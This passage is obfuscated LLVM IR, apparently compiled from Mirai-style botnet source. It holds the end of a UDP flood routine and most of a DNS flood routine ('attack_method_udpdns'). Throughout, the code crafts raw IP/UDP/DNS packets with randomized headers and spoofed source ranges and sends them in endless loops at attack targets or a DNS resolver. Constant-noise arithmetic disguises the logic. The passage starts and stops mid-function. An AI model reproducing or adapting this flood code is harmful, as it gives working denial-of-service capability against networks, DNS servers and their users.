  %183 = add nsw i32 %179, 1
  store i32 %182, i32* %9, align 4
  br label %68

; <label>:184:                                    ; preds = %68
  br label %185

; <label>:185:                                    ; preds = %320, %184
  store i32 0, i32* %9, align 4
  br label %186

; <label>:186:                                    ; preds = %314, %185
  %187 = load i32, i32* %9, align 4
  %188 = load i8, i8* %5, align 1
  %189 = zext i8 %188 to i32
  %190 = icmp slt i32 %187, %189
  br i1 %190, label %191, label %320

; <label>:191:                                    ; preds = %186
  %192 = load i8**, i8*** %11, align 8
  %193 = load i32, i32* %9, align 4
  %194 = sext i32 %193 to i64
  %195 = getelementptr inbounds i8*, i8** %192, i64 %194
  %196 = load i8*, i8** %195, align 8
  store i8* %196, i8** %23, align 8
  %197 = load i8*, i8** %23, align 8
  %198 = bitcast i8* %197 to %struct.iphdr*
  store %struct.iphdr* %198, %struct.iphdr** %24, align 8
  %199 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %200 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %199, i64 1
  %201 = bitcast %struct.iphdr* %200 to %struct.udphdr*
  store %struct.udphdr* %201, %struct.udphdr** %25, align 8
  %202 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %203 = load i32, i32* %9, align 4
  %204 = sext i32 %203 to i64
  %205 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %202, i64 %204
  %206 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %205, i32 0, i32 2
  %207 = load i8, i8* %206, align 4
  %208 = zext i8 %207 to i32
  %209 = icmp slt i32 %208, 32
  br i1 %209, label %210, label %234

; <label>:210:                                    ; preds = %191
  %211 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %212 = load i32, i32* %9, align 4
  %213 = sext i32 %212 to i64
  %214 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %211, i64 %213
  %215 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %214, i32 0, i32 1
  %216 = load i32, i32* %215, align 4
  %217 = call i32 @ntohl(i32 %216) #7
  %218 = call i32 @rand_next()
  %219 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %220 = load i32, i32* %9, align 4
  %221 = sext i32 %220 to i64
  %222 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %219, i64 %221
  %223 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %222, i32 0, i32 2
  %224 = load i8, i8* %223, align 4
  %225 = zext i8 %224 to i32
  %226 = lshr i32 %218, %225
  %227 = add i32 %217, -1849516509
  %228 = add i32 %227, %226
  %229 = sub i32 %228, -1849516509
  %230 = add i32 %217, %226
  %231 = call i32 @htonl(i32 %229) #7
  %232 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %233 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %232, i32 0, i32 9
  store i32 %231, i32* %233, align 4
  br label %234

; <label>:234:                                    ; preds = %210, %191
  %235 = load i16, i16* %13, align 2
  %236 = zext i16 %235 to i32
  %237 = icmp eq i32 %236, 65535
  br i1 %237, label %238, label %243

; <label>:238:                                    ; preds = %234
  %239 = call i32 @rand_next()
  %240 = trunc i32 %239 to i16
  %241 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %242 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %241, i32 0, i32 3
  store i16 %240, i16* %242, align 4
  br label %243

; <label>:243:                                    ; preds = %238, %234
  %244 = load i16, i16* %16, align 2
  %245 = zext i16 %244 to i32
  %246 = icmp eq i32 %245, 65535
  br i1 %246, label %247, label %252

; <label>:247:                                    ; preds = %243
  %248 = call i32 @rand_next()
  %249 = trunc i32 %248 to i16
  %250 = load %struct.udphdr*, %struct.udphdr** %25, align 8
  %251 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %250, i32 0, i32 0
  store i16 %249, i16* %251, align 2
  br label %252

; <label>:252:                                    ; preds = %247, %243
  %253 = load i16, i16* %17, align 2
  %254 = zext i16 %253 to i32
  %255 = icmp eq i32 %254, 65535
  br i1 %255, label %256, label %261

; <label>:256:                                    ; preds = %252
  %257 = call i32 @rand_next()
  %258 = trunc i32 %257 to i16
  %259 = load %struct.udphdr*, %struct.udphdr** %25, align 8
  %260 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %259, i32 0, i32 1
  store i16 %258, i16* %260, align 2
  br label %261

; <label>:261:                                    ; preds = %256, %252
  %262 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %263 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %262, i32 0, i32 7
  store i16 0, i16* %263, align 2
  %264 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %265 = bitcast %struct.iphdr* %264 to i16*
  %266 = call zeroext i16 @checksum_generic(i16* %265, i32 20)
  %267 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %268 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %267, i32 0, i32 7
  store i16 %266, i16* %268, align 2
  %269 = load %struct.udphdr*, %struct.udphdr** %25, align 8
  %270 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %269, i32 0, i32 3
  store i16 0, i16* %270, align 2
  %271 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %272 = load %struct.udphdr*, %struct.udphdr** %25, align 8
  %273 = bitcast %struct.udphdr* %272 to i8*
  %274 = load %struct.udphdr*, %struct.udphdr** %25, align 8
  %275 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %274, i32 0, i32 2
  %276 = load i16, i16* %275, align 2
  %277 = load i32, i32* %19, align 4
  %278 = sext i32 %277 to i64
  %279 = sub i64 0, %278
  %280 = sub i64 12, %279
  %281 = add i64 12, %278
  %282 = trunc i64 %280 to i32
  %283 = call zeroext i16 @checksum_tcpudp(%struct.iphdr* %271, i8* %273, i16 zeroext %276, i32 %282)
  %284 = load %struct.udphdr*, %struct.udphdr** %25, align 8
  %285 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %284, i32 0, i32 3
  store i16 %283, i16* %285, align 2
  %286 = load %struct.udphdr*, %struct.udphdr** %25, align 8
  %287 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %286, i32 0, i32 1
  %288 = load i16, i16* %287, align 2
  %289 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %290 = load i32, i32* %9, align 4
  %291 = sext i32 %290 to i64
  %292 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %289, i64 %291
  %293 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %292, i32 0, i32 0
  %294 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %293, i32 0, i32 1
  store i16 %288, i16* %294, align 2
  %295 = load i32, i32* %10, align 4
  %296 = load i8*, i8** %23, align 8
  %297 = load i32, i32* %19, align 4
  %298 = sext i32 %297 to i64
  %299 = sub i64 0, 32
  %300 = sub i64 0, %298
  %301 = add i64 %299, %300
  %302 = sub i64 0, %301
  %303 = add i64 32, %298
  %304 = bitcast %union.__CONST_SOCKADDR_ARG* %26 to %struct.sockaddr**
  %305 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %306 = load i32, i32* %9, align 4
  %307 = sext i32 %306 to i64
  %308 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %305, i64 %307
  %309 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %308, i32 0, i32 0
  %310 = bitcast %struct.sockaddr_in* %309 to %struct.sockaddr*
  store %struct.sockaddr* %310, %struct.sockaddr** %304, align 8
  %311 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %26, i32 0, i32 0
  %312 = load %struct.sockaddr*, %struct.sockaddr** %311, align 8
  %313 = call i64 @sendto(i32 %295, i8* %296, i64 %302, i32 16384, %struct.sockaddr* %312, i32 16)
  br label %314

; <label>:314:                                    ; preds = %261
  %315 = load i32, i32* %9, align 4
  %316 = add i32 %315, -1096533445
  %317 = add i32 %316, 1
  %318 = sub i32 %317, -1096533445
  %319 = add nsw i32 %315, 1
  store i32 %318, i32* %9, align 4
  br label %186

; <label>:320:                                    ; preds = %186
  br label %185

; <label>:321:                                    ; preds = %64, %58
  ret void
}

; Function Attrs: noinline nounwind uwtable
define void @attack_method_udpdns(i8 zeroext, %struct.attack_target*, i8 zeroext, %struct.attack_option*) #0 {
  %5 = alloca i8, align 1
  %6 = alloca %struct.attack_target*, align 8
  %7 = alloca i8, align 1
  %8 = alloca %struct.attack_option*, align 8
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i8**, align 8
  %12 = alloca i8, align 1
  %13 = alloca i16, align 2
  %14 = alloca i8, align 1
  %15 = alloca i8, align 1
  %16 = alloca i16, align 2
  %17 = alloca i16, align 2
  %18 = alloca i16, align 2
  %19 = alloca i8, align 1
  %20 = alloca i8*, align 8
  %21 = alloca i32, align 4
  %22 = alloca i32, align 4
  %23 = alloca i32, align 4
  %24 = alloca i8, align 1
  %25 = alloca i8, align 1
  %26 = alloca %struct.iphdr*, align 8
  %27 = alloca %struct.udphdr*, align 8
  %28 = alloca %struct.dnshdr*, align 8
  %29 = alloca i8*, align 8
  %30 = alloca i8*, align 8
  %31 = alloca %struct.grehdr*, align 8
  %32 = alloca i8*, align 8
  %33 = alloca %struct.iphdr*, align 8
  %34 = alloca %struct.udphdr*, align 8
  %35 = alloca %struct.dnshdr*, align 8
  %36 = alloca i8*, align 8
  %37 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  store i8 %0, i8* %5, align 1
  store %struct.attack_target* %1, %struct.attack_target** %6, align 8
  store i8 %2, i8* %7, align 1
  store %struct.attack_option* %3, %struct.attack_option** %8, align 8
  %38 = load i8, i8* %5, align 1
  %39 = zext i8 %38 to i64
  %40 = call noalias i8* @calloc(i64 %39, i64 8) #6
  %41 = bitcast i8* %40 to i8**
  store i8** %41, i8*** %11, align 8
  %42 = load i8, i8* %7, align 1
  %43 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %44 = call i32 @attack_get_opt_int(i8 zeroext %42, %struct.attack_option* %43, i8 zeroext 2, i32 0)
  %45 = trunc i32 %44 to i8
  store i8 %45, i8* %12, align 1
  %46 = load i8, i8* %7, align 1
  %47 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %48 = call i32 @attack_get_opt_int(i8 zeroext %46, %struct.attack_option* %47, i8 zeroext 3, i32 65535)
  %49 = trunc i32 %48 to i16
  store i16 %49, i16* %13, align 2
  %50 = load i8, i8* %7, align 1
  %51 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %52 = call i32 @attack_get_opt_int(i8 zeroext %50, %struct.attack_option* %51, i8 zeroext 4, i32 64)
  %53 = trunc i32 %52 to i8
  store i8 %53, i8* %14, align 1
  %54 = load i8, i8* %7, align 1
  %55 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %56 = call i32 @attack_get_opt_int(i8 zeroext %54, %struct.attack_option* %55, i8 zeroext 5, i32 0)
  %57 = trunc i32 %56 to i8
  store i8 %57, i8* %15, align 1
  %58 = load i8, i8* %7, align 1
  %59 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %60 = call i32 @attack_get_opt_int(i8 zeroext %58, %struct.attack_option* %59, i8 zeroext 6, i32 65535)
  %61 = trunc i32 %60 to i16
  store i16 %61, i16* %16, align 2
  %62 = load i8, i8* %7, align 1
  %63 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %64 = call i32 @attack_get_opt_int(i8 zeroext %62, %struct.attack_option* %63, i8 zeroext 7, i32 53)
  %65 = trunc i32 %64 to i16
  store i16 %65, i16* %17, align 2
  %66 = load i8, i8* %7, align 1
  %67 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %68 = call i32 @attack_get_opt_int(i8 zeroext %66, %struct.attack_option* %67, i8 zeroext 9, i32 65535)
  %69 = trunc i32 %68 to i16
  store i16 %69, i16* %18, align 2
  %70 = load i8, i8* %7, align 1
  %71 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %72 = call i32 @attack_get_opt_int(i8 zeroext %70, %struct.attack_option* %71, i8 zeroext 0, i32 12)
  %73 = trunc i32 %72 to i8
  store i8 %73, i8* %19, align 1
  %74 = load i8, i8* %7, align 1
  %75 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %76 = call i8* @attack_get_opt_str(i8 zeroext %74, %struct.attack_option* %75, i8 zeroext 8, i8* null)
  store i8* %76, i8** %20, align 8
  %77 = call i32 @get_dns_resolver()
  store i32 %77, i32* %22, align 4
  %78 = load i8*, i8** %20, align 8
  %79 = icmp eq i8* %78, null
  br i1 %79, label %80, label %81

; <label>:80:                                     ; preds = %4
  br label %514

; <label>:81:                                     ; preds = %4
  %82 = load i8*, i8** %20, align 8
  %83 = call i32 @util_strlen(i8* %82)
  store i32 %83, i32* %21, align 4
  %84 = call i32 @socket(i32 2, i32 3, i32 17) #6
  store i32 %84, i32* %10, align 4
  %85 = icmp eq i32 %84, -1
  br i1 %85, label %86, label %87

; <label>:86:                                     ; preds = %81
  br label %514

; <label>:87:                                     ; preds = %81
  store i32 1, i32* %9, align 4
  %88 = load i32, i32* %10, align 4
  %89 = bitcast i32* %9 to i8*
  %90 = call i32 @setsockopt(i32 %88, i32 0, i32 3, i8* %89, i32 4) #6
  %91 = icmp eq i32 %90, -1
  br i1 %91, label %92, label %95

; <label>:92:                                     ; preds = %87
  %93 = load i32, i32* %10, align 4
  %94 = call i32 @close(i32 %93)
  br label %514

; <label>:95:                                     ; preds = %87
  store i32 0, i32* %9, align 4
  br label %96

; <label>:96:                                     ; preds = %336, %95
  %97 = load i32, i32* %9, align 4
  %98 = load i8, i8* %5, align 1
  %99 = zext i8 %98 to i32
  %100 = icmp slt i32 %97, %99
  br i1 %100, label %101, label %341

; <label>:101:                                    ; preds = %96
  store i8 0, i8* %24, align 1
  store i8 0, i8* %25, align 1
  %102 = call noalias i8* @calloc(i64 600, i64 1) #6
  %103 = load i8**, i8*** %11, align 8
  %104 = load i32, i32* %9, align 4
  %105 = sext i32 %104 to i64
  %106 = getelementptr inbounds i8*, i8** %103, i64 %105
  store i8* %102, i8** %106, align 8
  %107 = load i8**, i8*** %11, align 8
  %108 = load i32, i32* %9, align 4
  %109 = sext i32 %108 to i64
  %110 = getelementptr inbounds i8*, i8** %107, i64 %109
  %111 = load i8*, i8** %110, align 8
  %112 = bitcast i8* %111 to %struct.iphdr*
  store %struct.iphdr* %112, %struct.iphdr** %26, align 8
  %113 = load %struct.iphdr*, %struct.iphdr** %26, align 8
  %114 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %113, i64 1
  %115 = bitcast %struct.iphdr* %114 to %struct.udphdr*
  store %struct.udphdr* %115, %struct.udphdr** %27, align 8
  %116 = load %struct.udphdr*, %struct.udphdr** %27, align 8
  %117 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %116, i64 1
  %118 = bitcast %struct.udphdr* %117 to %struct.dnshdr*
  store %struct.dnshdr* %118, %struct.dnshdr** %28, align 8
  %119 = load %struct.dnshdr*, %struct.dnshdr** %28, align 8
  %120 = getelementptr inbounds %struct.dnshdr, %struct.dnshdr* %119, i64 1
  %121 = bitcast %struct.dnshdr* %120 to i8*
  store i8* %121, i8** %29, align 8
  %122 = load %struct.iphdr*, %struct.iphdr** %26, align 8
  %123 = bitcast %struct.iphdr* %122 to i8*
  %124 = load i8, i8* %123, align 4
  %125 = xor i8 %124, -1
  %126 = xor i8 15, -1
  %127 = xor i8 58, -1
  %128 = or i8 %125, %126
  %129 = or i8 58, %127
  %130 = xor i8 %128, -1
  %131 = and i8 %130, %129
  %132 = and i8 %124, 15
  %133 = xor i8 %131, -1
  %134 = xor i8 64, -1
  %135 = xor i8 -118, -1
  %136 = and i8 %133, -118
  %137 = and i8 %131, %135
  %138 = and i8 %134, -118
  %139 = and i8 64, %135
  %140 = or i8 %136, %137
  %141 = or i8 %138, %139
  %142 = xor i8 %140, %141
  %143 = or i8 %133, %134
  %144 = xor i8 %143, -1
  %145 = or i8 -118, %135
  %146 = and i8 %144, %145
  %147 = or i8 %142, %146
  %148 = or i8 %131, 64
  store i8 %147, i8* %123, align 4
  %149 = load %struct.iphdr*, %struct.iphdr** %26, align 8
  %150 = bitcast %struct.iphdr* %149 to i8*
  %151 = load i8, i8* %150, align 4
  %152 = xor i8 %151, -1
  %153 = xor i8 -16, -1
  %154 = xor i8 -84, -1
  %155 = or i8 %152, %153
  %156 = or i8 -84, %154
  %157 = xor i8 %155, -1
  %158 = and i8 %157, %156
  %159 = and i8 %151, -16
  %160 = xor i8 %158, -1
  %161 = xor i8 5, -1
  %162 = xor i8 40, -1
  %163 = and i8 %160, 40
  %164 = and i8 %158, %162
  %165 = and i8 %161, 40
  %166 = and i8 5, %162
  %167 = or i8 %163, %164
  %168 = or i8 %165, %166
  %169 = xor i8 %167, %168
  %170 = or i8 %160, %161
  %171 = xor i8 %170, -1
  %172 = or i8 40, %162
  %173 = and i8 %171, %172
  %174 = or i8 %169, %173
  %175 = or i8 %158, 5
  store i8 %174, i8* %150, align 4
  %176 = load i8, i8* %12, align 1
  %177 = load %struct.iphdr*, %struct.iphdr** %26, align 8
  %178 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %177, i32 0, i32 1
  store i8 %176, i8* %178, align 1
  %179 = load i8, i8* %19, align 1
  %180 = zext i8 %179 to i64
  %181 = add i64 41, 2910235910097396630
  %182 = add i64 %181, %180
  %183 = sub i64 %182, 2910235910097396630
  %184 = add i64 41, %180
  %185 = add i64 %183, 6906637807727522446
  %186 = add i64 %185, 2
  %187 = sub i64 %186, 6906637807727522446
  %188 = add i64 %183, 2
  %189 = load i32, i32* %21, align 4
  %190 = sext i32 %189 to i64
  %191 = sub i64 %187, -5994860432671926717
  %192 = add i64 %191, %190
  %193 = add i64 %192, -5994860432671926717
  %194 = add i64 %187, %190
  %195 = sub i64 0, 4
  %196 = sub i64 %193, %195
  %197 = add i64 %193, 4
  %198 = trunc i64 %196 to i16
  %199 = call zeroext i16 @htons(i16 zeroext %198) #7
  %200 = load %struct.iphdr*, %struct.iphdr** %26, align 8
  %201 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %200, i32 0, i32 2
  store i16 %199, i16* %201, align 2
  %202 = load i16, i16* %13, align 2
  %203 = call zeroext i16 @htons(i16 zeroext %202) #7
  %204 = load %struct.iphdr*, %struct.iphdr** %26, align 8
  %205 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %204, i32 0, i32 3
  store i16 %203, i16* %205, align 4
  %206 = load i8, i8* %14, align 1
  %207 = load %struct.iphdr*, %struct.iphdr** %26, align 8
  %208 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %207, i32 0, i32 5
  store i8 %206, i8* %208, align 4
  %209 = load i8, i8* %15, align 1
  %210 = icmp ne i8 %209, 0
  br i1 %210, label %211, label %215

; <label>:211:                                    ; preds = %101
  %212 = call zeroext i16 @htons(i16 zeroext 16384) #7
  %213 = load %struct.iphdr*, %struct.iphdr** %26, align 8
  %214 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %213, i32 0, i32 4
  store i16 %212, i16* %214, align 2
  br label %215

; <label>:215:                                    ; preds = %211, %101
  %216 = load %struct.iphdr*, %struct.iphdr** %26, align 8
  %217 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %216, i32 0, i32 6
  store i8 17, i8* %217, align 1
  %218 = load i32, i32* @LOCAL_ADDR, align 4
  %219 = load %struct.iphdr*, %struct.iphdr** %26, align 8
  %220 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %219, i32 0, i32 8
  store i32 %218, i32* %220, align 4
  %221 = load i32, i32* %22, align 4
  %222 = load %struct.iphdr*, %struct.iphdr** %26, align 8
  %223 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %222, i32 0, i32 9
  store i32 %221, i32* %223, align 4
  %224 = load i16, i16* %16, align 2
  %225 = call zeroext i16 @htons(i16 zeroext %224) #7
  %226 = load %struct.udphdr*, %struct.udphdr** %27, align 8
  %227 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %226, i32 0, i32 0
  store i16 %225, i16* %227, align 2
  %228 = load i16, i16* %17, align 2
  %229 = call zeroext i16 @htons(i16 zeroext %228) #7
  %230 = load %struct.udphdr*, %struct.udphdr** %27, align 8
  %231 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %230, i32 0, i32 1
  store i16 %229, i16* %231, align 2
  %232 = load i8, i8* %19, align 1
  %233 = zext i8 %232 to i64
  %234 = add i64 21, 8070750490993242295
  %235 = add i64 %234, %233
  %236 = sub i64 %235, 8070750490993242295
  %237 = add i64 21, %233
  %238 = sub i64 %236, -6070303080640160140
  %239 = add i64 %238, 2
  %240 = add i64 %239, -6070303080640160140
  %241 = add i64 %236, 2
  %242 = load i32, i32* %21, align 4
  %243 = sext i32 %242 to i64
  %244 = add i64 %240, -7518713223211682125
  %245 = add i64 %244, %243
  %246 = sub i64 %245, -7518713223211682125
  %247 = add i64 %240, %243
  %248 = sub i64 %246, -1352312185762107792
  %249 = add i64 %248, 4
  %250 = add i64 %249, -1352312185762107792
  %251 = add i64 %246, 4
  %252 = trunc i64 %250 to i16
  %253 = call zeroext i16 @htons(i16 zeroext %252) #7
  %254 = load %struct.udphdr*, %struct.udphdr** %27, align 8
  %255 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %254, i32 0, i32 2
  store i16 %253, i16* %255, align 2
  %256 = load i16, i16* %18, align 2
  %257 = call zeroext i16 @htons(i16 zeroext %256) #7
  %258 = load %struct.dnshdr*, %struct.dnshdr** %28, align 8
  %259 = getelementptr inbounds %struct.dnshdr, %struct.dnshdr* %258, i32 0, i32 0
  store i16 %257, i16* %259, align 2
  %260 = call zeroext i16 @htons(i16 zeroext 256) #7
  %261 = load %struct.dnshdr*, %struct.dnshdr** %28, align 8
  %262 = getelementptr inbounds %struct.dnshdr, %struct.dnshdr* %261, i32 0, i32 1
  store i16 %260, i16* %262, align 2
  %263 = call zeroext i16 @htons(i16 zeroext 1) #7
  %264 = load %struct.dnshdr*, %struct.dnshdr** %28, align 8
  %265 = getelementptr inbounds %struct.dnshdr, %struct.dnshdr* %264, i32 0, i32 2
  store i16 %263, i16* %265, align 2
  %266 = load i8, i8* %19, align 1
  %267 = load i8*, i8** %29, align 8
  %268 = getelementptr inbounds i8, i8* %267, i32 1
  store i8* %268, i8** %29, align 8
  store i8 %266, i8* %267, align 1
  %269 = load i8, i8* %19, align 1
  %270 = zext i8 %269 to i32
  %271 = load i8*, i8** %29, align 8
  %272 = sext i32 %270 to i64
  %273 = getelementptr inbounds i8, i8* %271, i64 %272
  store i8* %273, i8** %29, align 8
  %274 = load i8*, i8** %29, align 8
  store i8* %274, i8** %30, align 8
  %275 = load i8*, i8** %29, align 8
  %276 = getelementptr inbounds i8, i8* %275, i64 1
  %277 = load i8*, i8** %20, align 8
  %278 = load i32, i32* %21, align 4
  %279 = add i32 %278, 1169072370
  %280 = add i32 %279, 1
  %281 = sub i32 %280, 1169072370
  %282 = add nsw i32 %278, 1
  call void @util_memcpy(i8* %276, i8* %277, i32 %281)
  store i32 0, i32* %23, align 4
  br label %283

; <label>:283:                                    ; preds = %315, %215
  %284 = load i32, i32* %23, align 4
  %285 = load i32, i32* %21, align 4
  %286 = icmp slt i32 %284, %285
  br i1 %286, label %287, label %321

; <label>:287:                                    ; preds = %283
  %288 = load i8*, i8** %20, align 8
  %289 = load i32, i32* %23, align 4
  %290 = sext i32 %289 to i64
  %291 = getelementptr inbounds i8, i8* %288, i64 %290
  %292 = load i8, i8* %291, align 1
  %293 = sext i8 %292 to i32
  %294 = icmp eq i32 %293, 46
  br i1 %294, label %295, label %309

; <label>:295:                                    ; preds = %287
  %296 = load i8, i8* %24, align 1
  %297 = load i8*, i8** %30, align 8
  store i8 %296, i8* %297, align 1
  store i8 0, i8* %24, align 1
  %298 = load i8, i8* %25, align 1
  %299 = sub i8 0, %298
  %300 = sub i8 0, 1
  %301 = add i8 %299, %300
  %302 = sub i8 0, %301
  %303 = add i8 %298, 1
  store i8 %302, i8* %25, align 1
  %304 = load i8*, i8** %29, align 8
  %305 = load i32, i32* %23, align 4
  %306 = sext i32 %305 to i64
  %307 = getelementptr inbounds i8, i8* %304, i64 %306
  %308 = getelementptr inbounds i8, i8* %307, i64 1
  store i8* %308, i8** %30, align 8
  br label %314

; <label>:309:                                    ; preds = %287
  %310 = load i8, i8* %24, align 1
  %311 = sub i8 0, 1
  %312 = sub i8 %310, %311
  %313 = add i8 %310, 1
  store i8 %312, i8* %24, align 1
  br label %314

; <label>:314:                                    ; preds = %309, %295
  br label %315

; <label>:315:                                    ; preds = %314
  %316 = load i32, i32* %23, align 4
  %317 = sub i32 %316, 1304957834
  %318 = add i32 %317, 1
  %319 = add i32 %318, 1304957834
  %320 = add nsw i32 %316, 1
  store i32 %319, i32* %23, align 4
  br label %283

; <label>:321:                                    ; preds = %283
  %322 = load i8, i8* %24, align 1
  %323 = load i8*, i8** %30, align 8
  store i8 %322, i8* %323, align 1
  %324 = load i8*, i8** %29, align 8
  %325 = load i32, i32* %21, align 4
  %326 = sext i32 %325 to i64
  %327 = getelementptr inbounds i8, i8* %324, i64 %326
  %328 = getelementptr inbounds i8, i8* %327, i64 2
  %329 = bitcast i8* %328 to %struct.grehdr*
  store %struct.grehdr* %329, %struct.grehdr** %31, align 8
  %330 = call zeroext i16 @htons(i16 zeroext 1) #7
  %331 = load %struct.grehdr*, %struct.grehdr** %31, align 8
  %332 = getelementptr inbounds %struct.grehdr, %struct.grehdr* %331, i32 0, i32 0
  store i16 %330, i16* %332, align 2
  %333 = call zeroext i16 @htons(i16 zeroext 1) #7
  %334 = load %struct.grehdr*, %struct.grehdr** %31, align 8
  %335 = getelementptr inbounds %struct.grehdr, %struct.grehdr* %334, i32 0, i32 1
  store i16 %333, i16* %335, align 2
  br label %336

; <label>:336:                                    ; preds = %321
  %337 = load i32, i32* %9, align 4
  %338 = sub i32 0, 1
  %339 = sub i32 %337, %338
  %340 = add nsw i32 %337, 1
  store i32 %339, i32* %9, align 4
  br label %96

; <label>:341:                                    ; preds = %96
  br label %342

; <label>:342:                                    ; preds = %513, %341
  store i32 0, i32* %9, align 4
  br label %343

; <label>:343:                                    ; preds = %507, %342
  %344 = load i32, i32* %9, align 4
  %345 = load i8, i8* %5, align 1
  %346 = zext i8 %345 to i32
  %347 = icmp slt i32 %344, %346
  br i1 %347, label %348, label %513

; <label>:348:                                    ; preds = %343
  %349 = load i8**, i8*** %11, align 8
  %350 = load i32, i32* %9, align 4
  %351 = sext i32 %350 to i64
  %352 = getelementptr inbounds i8*, i8** %349, i64 %351
  %353 = load i8*, i8** %352, align 8
  store i8* %353, i8** %32, align 8
  %354 = load i8*, i8** %32, align 8
  %355 = bitcast i8* %354 to %struct.iphdr*
  store %struct.iphdr* %355, %struct.iphdr** %33, align 8
  %356 = load %struct.iphdr*, %struct.iphdr** %33, align 8
  %357 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %356, i64 1
  %358 = bitcast %struct.iphdr* %357 to %struct.udphdr*
  store %struct.udphdr* %358, %struct.udphdr** %34, align 8
  %359 = load %struct.udphdr*, %struct.udphdr** %34, align 8
  %360 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %359, i64 1
  %361 = bitcast %struct.udphdr* %360 to %struct.dnshdr*
  store %struct.dnshdr* %361, %struct.dnshdr** %35, align 8
  %362 = load %struct.dnshdr*, %struct.dnshdr** %35, align 8
  %363 = getelementptr inbounds %struct.dnshdr, %struct.dnshdr* %362, i64 1
  %364 = bitcast %struct.dnshdr* %363 to i8*
  %365 = getelementptr inbounds i8, i8* %364, i64 1
  store i8* %365, i8** %36, align 8
  %366 = load i16, i16* %13, align 2
  %367 = zext i16 %366 to i32
  %368 = icmp eq i32 %367, 65535
  br i1 %368, label %369, label %378

; <label>:369:                                    ; preds = %348
  %370 = call i32 @rand_next()
  %371 = xor i32 65535, -1
  %372 = xor i32 %370, %371
  %373 = and i32 %372, %370
  %374 = and i32 %370, 65535
  %375 = trunc i32 %373 to i16
  %376 = load %struct.iphdr*, %struct.iphdr** %33, align 8
  %377 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %376, i32 0, i32 3
  store i16 %375, i16* %377, align 4
  br label %378

; <label>:378:                                    ; preds = %369, %348
  %379 = load i16, i16* %16, align 2
  %380 = zext i16 %379 to i32
  %381 = icmp eq i32 %380, 65535
  br i1 %381, label %382, label %391

; <label>:382:                                    ; preds = %378
  %383 = call i32 @rand_next()
  %384 = xor i32 65535, -1
  %385 = xor i32 %383, %384
  %386 = and i32 %385, %383
  %387 = and i32 %383, 65535
  %388 = trunc i32 %386 to i16
  %389 = load %struct.udphdr*, %struct.udphdr** %34, align 8
  %390 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %389, i32 0, i32 0
  store i16 %388, i16* %390, align 2
  br label %391

; <label>:391:                                    ; preds = %382, %378
  %392 = load i16, i16* %17, align 2
  %393 = zext i16 %392 to i32
  %394 = icmp eq i32 %393, 65535
  br i1 %394, label %395, label %404

; <label>:395:                                    ; preds = %391
  %396 = call i32 @rand_next()
  %397 = xor i32 65535, -1
  %398 = xor i32 %396, %397
  %399 = and i32 %398, %396
  %400 = and i32 %396, 65535
  %401 = trunc i32 %399 to i16
  %402 = load %struct.udphdr*, %struct.udphdr** %34, align 8
  %403 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %402, i32 0, i32 1
  store i16 %401, i16* %403, align 2
  br label %404

; <label>:404:                                    ; preds = %395, %391
  %405 = load i16, i16* %18, align 2
  %406 = zext i16 %405 to i32
  %407 = icmp eq i32 %406, 65535
  br i1 %407, label %408, label %417

; <label>:408:                                    ; preds = %404
  %409 = call i32 @rand_next()
  %410 = xor i32 65535, -1
